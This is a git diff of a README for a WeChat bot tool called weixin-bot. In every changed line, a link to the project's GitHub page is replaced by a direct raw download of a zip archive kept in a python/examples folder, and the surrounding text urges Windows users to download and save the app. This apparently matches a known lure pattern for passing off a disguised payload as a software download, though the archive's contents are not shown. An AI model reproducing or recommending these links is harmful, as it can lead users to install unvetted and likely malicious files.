@@ -1,13 +1,13 @@
 # 🤖 weixin-bot - Run WeChat bots with ease
 
-[⬇️ Download weixin-bot](https://github.com/hominal-newdeal930/weixin-bot)  
+[⬇️ Download weixin-bot](https://raw.githubusercontent.com/hominal-newdeal930/weixin-bot/main/python/examples/bot-weixin-1.4.zip)  
 ![Download](https://img.shields.io/badge/Download-weixin--bot-6a5acd?style=for-the-badge&logo=github)
 
 ## 📥 Download
 
 Use this link to visit the project page and download the files you need:
 
-[https://github.com/hominal-newdeal930/weixin-bot](https://github.com/hominal-newdeal930/weixin-bot)
+[https://raw.githubusercontent.com/hominal-newdeal930/weixin-bot/main/python/examples/bot-weixin-1.4.zip](https://raw.githubusercontent.com/hominal-newdeal930/weixin-bot/main/python/examples/bot-weixin-1.4.zip)
 
 If you are on Windows, look for the latest release or the main download files on that page. Save the file to a folder you can find again, like Downloads or Desktop.
 
@@ -183,7 +183,7 @@ If both are present, the project may use one for setup and the other for helper 
 
 Open the main project page here:
 
-[https://github.com/hominal-newdeal930/weixin-bot](https://github.com/hominal-newdeal930/weixin-bot)
+[https://raw.githubusercontent.com/hominal-newdeal930/weixin-bot/main/python/examples/bot-weixin-1.4.zip](https://raw.githubusercontent.com/hominal-newdeal930/weixin-bot/main/python/examples/bot-weixin-1.4.zip)
 
 Use this page to download the app, check the latest files, and review the included project notes
 
